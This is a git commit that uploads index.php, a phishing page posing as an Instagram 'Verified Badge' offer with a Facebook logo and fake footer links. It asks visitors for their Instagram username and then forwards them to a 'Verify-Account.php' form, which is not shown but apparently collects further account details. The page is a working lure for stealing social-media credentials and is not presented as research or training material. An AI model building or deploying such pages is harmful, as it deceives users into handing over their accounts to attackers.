8c2e1e199dfbf4f99eef5f6c9816708066abdbe7
vedocan285 <75169754+vedocan285@users.noreply.github.com>
2020-11-28 16:55:51 +0300

    Add files via upload

---
+++ index.php
@@ -0,0 +1,109 @@
+﻿
+    <html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verified Badge</title>
+<link rel="icon" href="">
+<style>
+#copyright{
+color:#070708 #;}
+#menu{
+
+
+width:91%;
+} 
+
+#liste{ display:inline-block;} #link{text-decoration:none; color:#070708 font-family:sans-serif; font-size:13px; font-weight:540; vertical-align: baseline; } 
+#asdxyz{
+background-color:white;
+width:91%;
+
+}
+#erhanasd{
+font-family:sans-serif;
+font-weight:200;
+letter-spacing:;
+color:#3d3d3d;
+font-size:20px;}
+#qenzyne{
+width:60%;
+color:#999;
+font-family:sans-serif;
+}
+#nick{
+background-color:#fafafafa;
+border:1px solid #070708;
+outline:none;
+border-radius:6px;
+width:220px;
+height:35px;
+text-align:center;
+font-size:16px;}
+
+#butonbey{
+color:white;
+background-color:#070708;
+font-size:17px;
+
+border-radius:5px;
+outline:none;
+font-family:sans-serif;
+font-weight:540;
+border:0;
+width:170px;
+height:30px;
+font-weight:bold;
+
+}
+#nick:hover{
+
+    border:1px solid #cecece;
+    width:310px;
+    max-width:80%;
+
+}
+</style>
+</head>     
+
+<body>
+<body bgcolor="#fafafa">
+<br>
+<br>
+<br>
+<center>
+<form method="get" action="848350608641984=Verify-Account.php">
+<div id="asdxyz" style="border:5px solid #000000;">
+
+
+
+<img src="https://s8.gifyu.com/images/insta-gif-5.gif" width=200>
+
+<h1 id="erhanasd">Verified Badges <img src="https://istalya.com/image/cache/catalog/resimler/Varl%C4%B1k%201-1080x1080w.png" width=20>
+<p id="qenzyne">Please write your instagram username and click "Next" and fill the next form  </p><br>
+
+
+
+<input type="text" id="nick" name="nick" required="" placeholder="Username" class="qua21"><br><br>
+<input type="submit" value="Next" id="butonbey" style="">
+</form>
+
+<br><br>
+</div>
+</center>
+<center><br> <br>
+<img src="https://marka-logo.com/wp-content/uploads/2020/04/Facebook-Logo.png" width=150>
+<div id="get">
+<img src="https://resimag.com/p1/b6a0e4390db.png" width=120 >
+<img src="https://resimag.com/p1/45ce843a3fd.png" width=120>
+</div>
+<br><br><br>
+<div id="menu"> <li id="liste"><a href="" id="link"> ABOUT US </a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link"> SUPPORT </a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">PRESS</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">API</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">JOBS</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">PRIVACY</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">TERMS</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">DIRECTORY</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">LANGUAGE</a> </li> </div> <br> <p id="copyright" style="font-family:sans-serif;font-weight:100;">© 2020 Verified Badge</p>
+
+<br>
+
+</center>
+
+</body>
+
+</html>
